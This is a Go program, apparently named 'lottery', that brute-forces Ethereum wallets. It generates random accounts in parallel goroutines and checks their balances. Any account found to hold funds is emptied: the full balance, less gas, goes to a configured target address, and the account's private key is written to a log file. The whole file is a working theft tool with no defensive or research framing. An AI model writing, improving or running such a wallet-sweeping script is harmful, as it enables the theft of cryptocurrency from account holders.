package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"os"
	"sync"
	"time"

	"github.com/242617/lottery/config"
	"github.com/242617/lottery/ethereum"
)

var n uint64
var l sync.RWMutex

func init() { log.SetFlags(log.Lshortfile) }
func main() {

	configFile := flag.String("config", "./config.yaml", "Config path")
	flag.Parse()

	err := config.Init(*configFile)
	if err != nil {
		log.Fatal(err)
	}

	err = ethereum.Init(config.Config.IPC)
	if err != nil {
		log.Fatal(err)
	}

	generator := ethereum.NewGenerator()
	for s := 0; s <= config.Config.Streams; s++ {
		go func() {
			for {
				try(generator)
			}
		}()
	}

	start := time.Now()
	go func() {
		for {
			time.Sleep(time.Hour)
			l.RLock()
			save("stat.log", fmt.Sprintf("%d tries in %s\n", n, time.Since(start).String()))
			l.RUnlock()
		}
	}()

	select {}
}

func try(generator chan ethereum.Account) {

	defer func() {
		l.Lock()
		n++
		l.Unlock()
	}()

	account := <-generator

	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
	defer cancel()

	balance, err := ethereum.Balance(ctx, account.Address)
	if err != nil {
		log.Println(err)
		save("errors.log", fmt.Sprintf("err: %s", err.Error()))
		return
	}
	if balance.Cmp(big.NewInt(0)) != 1 {
		return
	}

	nonce, err := ethereum.Nonce(ctx, account.Address)
	if err != nil {
		log.Println(err)
		save("errors.log", fmt.Sprintf("err: %s", err.Error()))
		return
	}

	gasPrice, err := ethereum.GasPrice(ctx)
	if err != nil {
		log.Println(err)
		save("errors.log", fmt.Sprintf("err: %s", err.Error()))
		return
	}

	amount := big.NewInt(0)
	amount.Sub(
		balance,
		big.NewInt(0).Mul(
			gasPrice,
			big.NewInt(int64(config.Config.GasLimit)),
		),
	)

	hash, err := ethereum.SendTransaction(ctx, account, config.Config.TargetAddress, nonce, amount, gasPrice)
	if err != nil {
		log.Fatal(err)
		save("errors.log", fmt.Sprintf("err: %s", err.Error()))
		return
	}

	fmt.Println(hash, account.Address, amount)
	save("result.log", fmt.Sprintf("balance: %s, hash: %s, amount:%s\n", balance, hash, amount))
	save("result.log", fmt.Sprintf("address: %s, private key:%s\n", account.Address, account.PrivateKey))

}

func save(filename string, message string) {
	data := []byte(fmt.Sprintf("%s: %s", time.Now().Format("02.01.06 15:04:05"), message))
	f, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
	if err != nil {
		log.Println(err)
		return
	}
	n, err := f.Write(data)
	if err == nil && n < len(data) {
		err = io.ErrShortWrite
		log.Println(err)
		return
	}
	if err := f.Close(); err != nil {
		log.Println(err)
		return
	}
}
